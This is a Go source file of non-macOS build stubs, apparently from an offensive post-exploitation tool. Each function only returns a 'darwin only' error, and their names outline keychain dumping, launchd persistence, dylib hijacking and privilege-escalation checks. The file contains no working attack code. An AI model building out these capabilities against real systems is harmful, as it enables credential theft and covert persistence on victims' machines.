//go:build !darwin

package main

import "fmt"

func darwinKeychainDump() (string, error)           { return "", fmt.Errorf("darwin only") }
func darwinLaunchdInstall(_, _ string) (string, error) { return "", fmt.Errorf("darwin only") }
func darwinLaunchdRemove(_ string) (string, error)  { return "", fmt.Errorf("darwin only") }
func darwinDylibHijack(_ string) (string, error)    { return "", fmt.Errorf("darwin only") }
func darwinEnumUsers() (string, error)              { return "", fmt.Errorf("darwin only") }
func darwinOsascript(_ string) (string, error)      { return "", fmt.Errorf("darwin only") }
func darwinPrivescCheck() (string, error)           { return "", fmt.Errorf("darwin only") }
func darwinSIPStatus() (string, error)              { return "", fmt.Errorf("darwin only") }
